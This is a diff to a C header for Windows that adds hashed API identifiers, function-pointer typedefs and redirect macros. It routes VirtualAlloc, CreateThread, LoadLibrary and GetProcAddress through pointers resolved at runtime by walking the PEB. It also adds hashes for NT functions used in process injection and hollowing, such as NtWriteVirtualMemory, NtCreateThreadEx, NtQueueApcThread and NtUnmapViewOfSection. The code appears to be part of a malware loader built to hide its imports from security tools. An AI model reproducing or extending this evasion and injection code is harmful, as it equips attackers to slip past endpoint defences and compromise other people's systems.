@@ -65,6 +65,13 @@
 #define H_GetThreadContext              0xC76B4E42u
 #define H_SetThreadContext              0xA917D6D6u
 #define H_GetModuleHandleW              0x4AB16D94u
+#define H_VirtualAlloc                  0x19FBBF49u
+#define H_VirtualFree                   0x0888E730u
+#define H_CreateThread                  0xB67ACBEFu
+#define H_GetProcAddress                0xAADFAB0Bu
+#define H_LoadLibraryA                  0x01ED9ADDu
+#define H_LoadLibraryW                  0x01ED9ACBu
+#define H_GetModuleHandleA              0x4AB16D82u
 
 /* =========================================================================
  * Function-pointer typedefs
@@ -124,6 +131,14 @@ typedef DWORD  (WINAPI *FP_ResumeThread)(HANDLE);
 typedef BOOL   (WINAPI *FP_GetThreadContext)(HANDLE, LPCONTEXT);
 typedef BOOL   (WINAPI *FP_SetThreadContext)(HANDLE, const CONTEXT*);
 typedef HMODULE (WINAPI *FP_GetModuleHandleW)(LPCWSTR);
+typedef LPVOID  (WINAPI *FP_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL    (WINAPI *FP_VirtualFree)(LPVOID, SIZE_T, DWORD);
+typedef HANDLE  (WINAPI *FP_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
+                                          LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef FARPROC (WINAPI *FP_GetProcAddress)(HMODULE, LPCSTR);
+typedef HMODULE (WINAPI *FP_LoadLibraryA)(LPCSTR);
+typedef HMODULE (WINAPI *FP_LoadLibraryW)(LPCWSTR);
+typedef HMODULE (WINAPI *FP_GetModuleHandleA)(LPCSTR);
 
 /* =========================================================================
  * Extern declarations of resolved function pointers (_r_ prefix)
@@ -167,12 +182,43 @@ extern FP_ResumeThread                  _r_ResumeThread;
 extern FP_GetThreadContext              _r_GetThreadContext;
 extern FP_SetThreadContext              _r_SetThreadContext;
 extern FP_GetModuleHandleW              _r_GetModuleHandleW;
+extern FP_VirtualAlloc                  _r_VirtualAlloc;
+extern FP_VirtualFree                   _r_VirtualFree;
+extern FP_CreateThread                  _r_CreateThread;
+extern FP_GetProcAddress                _r_GetProcAddress;
+extern FP_LoadLibraryA                  _r_LoadLibraryA;
+extern FP_LoadLibraryW                  _r_LoadLibraryW;
+extern FP_GetModuleHandleA              _r_GetModuleHandleA;
 
 /* =========================================================================
  * Initializer — call once at startup before any WinAPI use
  * ========================================================================= */
 
 void api_init(void);
+
+/* Generic resolver — walks PEB module list and finds fn_hash in any loaded DLL.
+ * Use for NT functions and any other API not covered by the redirect macros. */
+void *resolve_fn(uint32_t fn_hash);
+
+/* NT function hashes for use with resolve_fn() */
+#define H_NT_NtOpenProcess            0xAED3CBA0u
+#define H_NT_NtAllocateVirtualMemory  0xF0146CE2u
+#define H_NT_NtWriteVirtualMemory     0x411B83A2u
+#define H_NT_NtCreateThreadEx         0xBB485288u
+#define H_NT_NtProtectVirtualMemory   0xCD363694u
+#define H_NT_NtReadVirtualMemory      0xE88BED2Du
+#define H_NT_NtQueueApcThread         0x4D230412u
+#define H_NT_NtCreateSection          0x01D8A572u
+#define H_NT_NtMapViewOfSection       0xDA22F84Eu
+#define H_NT_NtUnmapViewOfSection     0x7473FDF5u
+#define H_NT_NtSuspendThread          0xE03939BBu
+#define H_NT_NtResumeThread           0xDAE08088u
+#define H_NT_NtGetContextThread       0xBFC8B678u
+#define H_NT_NtSetContextThread       0xD8FDE5ECu
+#define H_NT_NtOpenFile               0xF43A35ADu
+#define H_NT_NtClose                  0xF866D229u
+#define H_NT_NtQueryInformationProcess 0x8BE68952u
+#define H_NT_RtlGetVersion            0x30571EA3u
 
 /* =========================================================================
  * Redirect macros — MUST appear after all WinAPI #includes
@@ -258,5 +304,19 @@ void api_init(void);
 #define SetThreadContext                _r_SetThreadContext
 #undef GetModuleHandleW
 #define GetModuleHandleW                _r_GetModuleHandleW
+#undef VirtualAlloc
+#define VirtualAlloc                    _r_VirtualAlloc
+#undef VirtualFree
+#define VirtualFree                     _r_VirtualFree
+#undef CreateThread
+#define CreateThread                    _r_CreateThread
+#undef GetProcAddress
+#define GetProcAddress                  _r_GetProcAddress
+#undef LoadLibraryA
+#define LoadLibraryA                    _r_LoadLibraryA
+#undef LoadLibraryW
+#define LoadLibraryW                    _r_LoadLibraryW
+#undef GetModuleHandleA
+#define GetModuleHandleA                _r_GetModuleHandleA
 
 #endif /* API_RESOLVE_H */
